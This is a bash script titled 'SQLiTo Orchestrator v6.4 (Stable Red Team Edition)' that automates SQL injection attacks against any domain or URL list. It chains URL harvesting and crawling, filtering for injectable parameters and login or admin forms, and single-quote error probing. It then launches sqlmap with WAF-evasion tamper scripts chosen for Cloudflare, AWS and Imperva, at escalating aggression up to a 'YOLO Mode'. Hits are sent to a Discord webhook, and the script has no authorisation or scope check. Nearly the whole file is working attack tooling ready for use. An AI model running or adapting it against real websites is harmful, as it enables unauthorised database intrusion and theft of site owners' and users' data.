#!/bin/bash

# ==============================================================================
# TITLE: SQLiTo Orchestrator v6.4 (Stable Red Team Edition)
# AUTHOR: ?
# DESCRIPTION: Parallel Recon + Heuristic Filtering + POST/Form Auditing
# ==============================================================================

# --- CONFIGURATION ---
WORKSPACE_DIR="sqlito_workspace"
VENV_DIR="$HOME/.sqlito_venv"
DISCORD_WEBHOOK=""

# Files
TEMP_RAW="recon_raw.tmp"
TEMP_FILTERED="recon_filtered.tmp"
ERROR_CANDIDATES="candidates_error.txt"
LIVE_GET="live_targets_get.txt"      # URLs with ?id=1
LIVE_POST="live_targets_forms.txt"   # URLs like /login
SQLMAP_RESULTS="sqlmap_results.csv"

# Regex Blacklists
EXT_BLACKLIST="\.(css|jpg|jpeg|gif|png|svg|ico|woff|woff2|ttf|eot|js|json|pdf|txt|xml|zip|tar|gz|rar)(\?|$)"
PARAM_BLACKLIST="(ver=|version=|utm_|fbclid=|token=|timestamp=|nb=|cb=|ref=|assets|static)"

# Keywords that suggest an interactive form
FORM_KEYWORDS="login|signin|signup|register|submit|contact|feedback|upload|password|profile|admin|search|account|mail"

# Colors
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# --- UTILS ---

banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo "    _____ ____    __   _ ______           "
    echo "   / ___// __ \  / /  (_) ____/___        "
    echo "   \__ \/ / / / / /  / / /    / __ \       "
    echo "  ___/ / /_/ / / /__/ / /___/ /_/ /       "
    echo " /____/\___\_\/_____/_/\____/\____/  v6.4"
    echo -e "${NC}"
    echo "------------------------------------------------------------"
}

info() { echo -e "${BLUE}[*] $1${NC}"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }
error() { echo -e "${RED}[X] $1${NC}"; exit 1; }

notify() {
    local msg=$1
    if [ ! -z "$DISCORD_WEBHOOK" ]; then
        curl -H "Content-Type: application/json" -d "{\"content\": \"$msg\"}" $DISCORD_WEBHOOK > /dev/null 2>&1 &
    fi
}

setup_env() {
    mkdir -p "$WORKSPACE_DIR"
    deps=("waybackurls" "gau" "httpx" "sqlmap" "jq" "qsreplace" "wafw00f")
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then warn "Missing dependency: $dep"; fi
    done
    if [ ! -d "$VENV_DIR" ]; then
        info "Initializing Python VENV..."
        python3 -m venv "$VENV_DIR"
        source "$VENV_DIR/bin/activate"
        pip install uro > /dev/null 2>&1
    else
        source "$VENV_DIR/bin/activate"
    fi
}

# --- PROTOCOL LOGIC ---

resolve_protocol() {
    info "Resolving protocol for $TARGET_DOMAIN..."
    RESOLVED_URL=$(echo "$TARGET_DOMAIN" | httpx -silent -timeout 5 -follow-redirects -status-code -mc 200,301,302,403 | head -n 1 | awk '{print $1}')
    
    if [ -z "$RESOLVED_URL" ]; then
        warn "Could not resolve via httpx. Fallback to http://"
        BASE_URL="http://$TARGET_DOMAIN"
    else
        BASE_URL="$RESOLVED_URL"
    fi
    success "Target resolved to: $BASE_URL"
}

mode_selection() {
    echo -e "\n${BOLD}SELECT OPERATION MODE:${NC}"
    echo -e "${CYAN}[1]${NC} Domain Recon (Full Cycle)"
    echo -e "${CYAN}[2]${NC} Import Target List (Direct Attack)"
    read -p ">> " MODE_OPT

    case $MODE_OPT in
        1)
            MODE="RECON"
            read -p "Enter Target Domain (e.g., example.com): " TARGET_DOMAIN
            [ -z "$TARGET_DOMAIN" ] && error "Domain is required."
            resolve_protocol
            ;;
        2)
            MODE="IMPORT"
            read -p "Enter path to URL list file: " IMPORT_FILE
            if [ ! -f "$IMPORT_FILE" ]; then error "File not found: $IMPORT_FILE"; fi
            
            # Copiar al workspace para procesar
            cp "$IMPORT_FILE" "$WORKSPACE_DIR/$TEMP_RAW"
            
            # Lógica robusta para extraer el BASE_URL de un archivo mezclado
            info "Analyzing import file to determine Base URL..."
            FIRST_URL=$(head -n 1 "$WORKSPACE_DIR/$TEMP_RAW")
            
            # Usar httpx para resolver la redirección real y el protocolo
            RESOLVED_BASE=$(echo "$FIRST_URL" | httpx -silent -timeout 3 -status-code -follow-redirects | awk '{print $1}')
            
            if [ ! -z "$RESOLVED_BASE" ]; then
                BASE_URL="$RESOLVED_BASE"
                # Extraer dominio limpio para reportes
                TARGET_DOMAIN=$(echo "$BASE_URL" | awk -F/ '{print $3}')
            else
                # Fallback sucio si httpx falla totalmente
                warn "Could not verify Base URL via network. Using first line entry."
                TARGET_DOMAIN="imported-target"
                BASE_URL="$FIRST_URL"
            fi
            
            success "Targets loaded. Main Target inferred: $BASE_URL"
            ;;
        *) error "Invalid selection." ;;
    esac
}

waf_detection() {
    echo -e "\n${BOLD}WAF CONFIGURATION:${NC}"
    info "Running WAF detection on $BASE_URL..."
    
    # Validar que BASE_URL no esté vacía o sea inválida antes de lanzar wafw00f
    if [[ "$BASE_URL" != http* ]]; then
        warn "Invalid Base URL detected ($BASE_URL). Skipping WAF check."
        WAF_RESULT=""
    else
        WAF_RESULT=$(wafw00f "$BASE_URL" -a | grep "is behind" | awk '{print $NF}')
    fi
    
    if [ ! -z "$WAF_RESULT" ]; then
        warn "WAF Detected: $WAF_RESULT"
        case $WAF_RESULT in
            *"Cloudflare"*) TAMPERS="between,randomcase,space2comment" ;;
            *"AWS"*)        TAMPERS="between,charencode" ;;
            *"Imperva"*)    TAMPERS="between,randomcase,space2comment,equaltolike" ;;
            *)              TAMPERS="randomcase,space2comment,equaltolike" ;;
        esac
        info "Auto-applied tamper scripts: $TAMPERS"
        EXTRA_LEVEL=1
        EXTRA_RISK=1
    else
        success "No WAF detected (or detection failed)."
        TAMPERS=""
        
        echo -e "${YELLOW}[?] No WAF found. Do you want to increase aggression?${NC}"
        echo -e "    ${CYAN}[1]${NC} Keep Safe (Level 1, Risk 1)"
        echo -e "    ${CYAN}[2]${NC} Go Hard (Level 3, Risk 2)"
        echo -e "    ${CYAN}[3]${NC} YOLO Mode (Level 5, Risk 3)"
        read -p ">> " AGGRO_OPT
        
        case $AGGRO_OPT in
            1) EXTRA_LEVEL=1; EXTRA_RISK=1 ;;
            2) EXTRA_LEVEL=3; EXTRA_RISK=2 ;;
            3) EXTRA_LEVEL=5; EXTRA_RISK=3 ;;
            *) EXTRA_LEVEL=1; EXTRA_RISK=1 ;;
        esac
        success "Aggression set to: Level $EXTRA_LEVEL | Risk $EXTRA_RISK"
    fi
}

performance_tuning() {
    echo -e "\n${BOLD}ATTACK SPEED:${NC}"
    echo -e "${CYAN}[1]${NC} Stealth (1 Thread, Delay 2s)"
    echo -e "${CYAN}[2]${NC} Balanced (3 Threads, Delay 0s)"
    echo -e "${CYAN}[3]${NC} Aggressive (10 Threads, Delay 0s)"
    read -p ">> " PERF_OPT
    case $PERF_OPT in
        1) SQL_THREADS="1"; SQL_DELAY="2";;
        2) SQL_THREADS="3"; SQL_DELAY="0";;
        3) SQL_THREADS="10"; SQL_DELAY="0";;
        *) SQL_THREADS="2"; SQL_DELAY="0";;
    esac
}

# --- RECON MODULES ---

passive_recon() {
    info "Phase 1: Deep Collection ($TARGET_DOMAIN)"
    waybackurls "$TARGET_DOMAIN" > "$WORKSPACE_DIR/wayback.tmp" &
    PID1=$!
    gau "$TARGET_DOMAIN" --threads 10 > "$WORKSPACE_DIR/gau.tmp" &
    PID2=$!
    wait $PID1 $PID2
    cat "$WORKSPACE_DIR/wayback.tmp" "$WORKSPACE_DIR/gau.tmp" > "$WORKSPACE_DIR/$TEMP_RAW"
    rm "$WORKSPACE_DIR/wayback.tmp" "$WORKSPACE_DIR/gau.tmp"
    success "Raw URLs Collected: $(wc -l < "$WORKSPACE_DIR/$TEMP_RAW")"
}

active_crawler() {
    echo -e "\n${MAGENTA}[?] Enable Active Crawling (Katana)?${NC}"
    read -p "Enable [y/N]: " CRAWL_OPT
    if [[ "$CRAWL_OPT" =~ ^[Yy]$ ]]; then
        info "Launching Katana on $BASE_URL..."
        katana -u "$BASE_URL" -d 2 -jc -silent -em ps >> "$WORKSPACE_DIR/$TEMP_RAW"
        
        info "Extracting hidden endpoints from JS files..."
        grep "\.js" "$WORKSPACE_DIR/$TEMP_RAW" > "$WORKSPACE_DIR/js_files.txt"
        cat "$WORKSPACE_DIR/js_files.txt" | httpx -silent -content-type | \
        grep -oE "['\"/]([a-zA-Z0-9_\-\./]+)['\"]" | tr -d "'\"" | grep "/" | sort -u > "$WORKSPACE_DIR/js_endpoints.txt"
        
        cat "$WORKSPACE_DIR/js_endpoints.txt" >> "$WORKSPACE_DIR/$TEMP_RAW"
        success "Extracted endpoints from JS."
    fi
}

filtering_process() {
    info "Phase 2: Dual-Stream Filtering (GET + POST)"
    
    # Pre-clean known garbage
    cat "$WORKSPACE_DIR/$TEMP_RAW" | grep -iEv "$EXT_BLACKLIST" > "$WORKSPACE_DIR/clean_base.tmp"

    # Stream A: GET Parameters
    cat "$WORKSPACE_DIR/clean_base.tmp" | grep '=' | grep -iEv "$PARAM_BLACKLIST" | uro > "$WORKSPACE_DIR/candidates_get.tmp"
    
    # Stream B: POST Forms
    cat "$WORKSPACE_DIR/clean_base.tmp" | grep -v '=' | grep -Ei "$FORM_KEYWORDS" | sort -u > "$WORKSPACE_DIR/candidates_forms.tmp"

    info "Verifying Liveness (httpx)..."
    
    # Check GET candidates
    if [ -s "$WORKSPACE_DIR/candidates_get.tmp" ]; then
        httpx -l "$WORKSPACE_DIR/candidates_get.tmp" -silent -mc 200 -threads 50 -timeout 5 | awk '{print $1}' > "$LIVE_GET"
    else
        touch "$LIVE_GET"
    fi

    # Check POST candidates
    if [ -s "$WORKSPACE_DIR/candidates_forms.tmp" ]; then
        httpx -l "$WORKSPACE_DIR/candidates_forms.tmp" -silent -mc 200 -threads 50 -timeout 5 | awk '{print $1}' > "$LIVE_POST"
    else
        touch "$LIVE_POST"
    fi

    GET_COUNT=$(wc -l < "$LIVE_GET")
    POST_COUNT=$(wc -l < "$LIVE_POST")
    success "Ready to Attack: $GET_COUNT (GET) | $POST_COUNT (POST)"
}

heuristic_check() {
    info "Phase 3: Heuristic Error Check (GET)"
    
    if [ ! -s "$LIVE_GET" ]; then
        warn "No GET parameters to check heuristically."
        return
    fi

    cat "$LIVE_GET" | qsreplace "'" | \
    httpx -silent -threads 20 \
    -match-string "syntax; error" \
    -match-string "mysql_fetch" \
    -match-string "ORA-" \
    -match-string "PostgreSQL" \
    -match-string "SQLServer" \
    -o "$WORKSPACE_DIR/$ERROR_CANDIDATES"
    
    ERR_COUNT=$(wc -l < "$WORKSPACE_DIR/$ERROR_CANDIDATES")
    if [ "$ERR_COUNT" -gt "0" ]; then
        success "HIGH PRIORITY: $ERR_COUNT targets threw SQL errors."
        cat "$WORKSPACE_DIR/$ERROR_CANDIDATES" "$LIVE_GET" | sort -u > "$WORKSPACE_DIR/merged.tmp" && mv "$WORKSPACE_DIR/merged.tmp" "$LIVE_GET"
    fi
}

# --- ATTACK MODULE ---

attack_sequence() {
    echo -e "\n${RED}${BOLD}[!!!] Phase 4: SQLMap Orchestration [!!!]${NC}"
    
    LVL=${EXTRA_LEVEL:-1}
    RSK=${EXTRA_RISK:-1}
    
    SQL_FLAGS="--threads=$SQL_THREADS --delay=$SQL_DELAY --random-agent --batch --parse-errors"
    [ ! -z "$TAMPERS" ] && SQL_FLAGS="$SQL_FLAGS --tamper=$TAMPERS"

    rm -f "$SQLMAP_RESULTS"

    # 1. ATTACK GET
    if [ -s "$LIVE_GET" ]; then
        info "Step 1: Auditing GET Parameters (Level: $LVL | Risk: $RSK)"
        sqlmap -m "$LIVE_GET" $SQL_FLAGS --level=$LVL --risk=$RSK --technique=BEU --smart --skip-static --results-file="$SQLMAP_RESULTS"
    else
        warn "Skipping Step 1: No GET targets."
    fi

    # 2. ATTACK POST
    if [ -s "$LIVE_POST" ]; then
        echo -e "\n${MAGENTA}[+] Step 2: Auditing POST Forms${NC}"
        FORM_LVL=$((LVL < 2 ? 2 : LVL))
        sqlmap -m "$LIVE_POST" $SQL_FLAGS --forms --level=$FORM_LVL --risk=$RSK --smart --results-file="$SQLMAP_RESULTS"
    else
        warn "Skipping Step 2: No POST form targets."
    fi

    # 3. DEEP SCAN (Main Domain)
    echo -e "\n${MAGENTA}[+] Step 3: Deep Scan on Main Domain${NC}"
    
    # FAIL-SAFE SELECTION FOR MAIN TARGET
    if [ "$MODE" == "IMPORT" ]; then
        # Try to grab a valid URL from GET list
        MAIN_TARGET=$(head -n 1 "$LIVE_GET")
        # If empty, try POST list
        [ -z "$MAIN_TARGET" ] && MAIN_TARGET=$(head -n 1 "$LIVE_POST")
        # If still empty, use BASE_URL resolved earlier
        [ -z "$MAIN_TARGET" ] && MAIN_TARGET="$BASE_URL"
    else
        MAIN_TARGET="$BASE_URL"
    fi

    if [ ! -z "$MAIN_TARGET" ] && [[ "$MAIN_TARGET" != http* ]]; then
         # Last resort format check
         MAIN_TARGET="http://$MAIN_TARGET"
    fi

    if [ ! -z "$MAIN_TARGET" ]; then
        info "Deep scanning target: $MAIN_TARGET"
        sqlmap -u "$MAIN_TARGET" $SQL_FLAGS --forms --crawl=2 --level=5 --risk=2 --technique=BEUSTQ --banner --results-file="$SQLMAP_RESULTS"
    else
        error "Could not determine a valid target for Deep Scan."
    fi
        
    # --- REPORTING ---
    echo -e "\n${BLUE}[*] Analysis complete. Parsing results...${NC}"
    
    if [ -f "$SQLMAP_RESULTS" ]; then
        LINE_COUNT=$(wc -l < "$SQLMAP_RESULTS")
        
        if [ "$LINE_COUNT" -gt "1" ]; then
            VULNS=$((LINE_COUNT - 1))
            echo -e "\n${GREEN}[$$$] SUCCESS! Found $VULNS confirmed vulnerabilities.${NC}"
            echo -e "${YELLOW}Vulnerable Endpoints:${NC}"
            cat "$SQLMAP_RESULTS" | grep -v "Target URL" | cut -d "," -f 2,4
            notify "SQLiTo found $VULNS vulnerabilities on $TARGET_DOMAIN."
        else
            warn "Results file exists but contains no vulnerabilities."
        fi
    else
        warn "No results file generated (SQLMap found nothing or failed)."
    fi
}

# --- MAIN ---
banner
setup_env
mode_selection
waf_detection
performance_tuning

if [ "$MODE" == "RECON" ]; then
    passive_recon
    active_crawler
fi

# CRITICAL FIX: Filtering MUST run for both Import and Recon modes
if [ -s "$WORKSPACE_DIR/$TEMP_RAW" ]; then
    filtering_process
    heuristic_check
else
    error "Target list ($TEMP_RAW) is empty or missing. Aborting."
fi

attack_sequence
echo -e "\n${BLUE}[*] Operation Complete.${NC}"
